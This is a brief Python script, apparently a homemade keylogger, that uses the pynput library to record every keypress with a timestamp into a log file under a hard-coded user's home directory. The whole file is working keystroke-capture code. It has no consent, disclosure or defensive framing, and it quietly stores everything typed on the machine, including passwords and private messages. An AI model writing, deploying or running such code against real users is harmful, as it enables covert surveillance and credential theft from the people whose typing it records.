from pynput.keyboard import Key, Listener
import logging

user = "crippa"
log_directory = f"/home/{user}/logs/kilogg3r"
file_name = "log"

logging.basicConfig(filename=(log_directory + file_name), level=logging.DEBUG, format='%(asctime)s : %(message)s')

def keypress(Key):
    logging.info(str(Key))

with Listener(on_press = keypress) as listener:
     listener.join()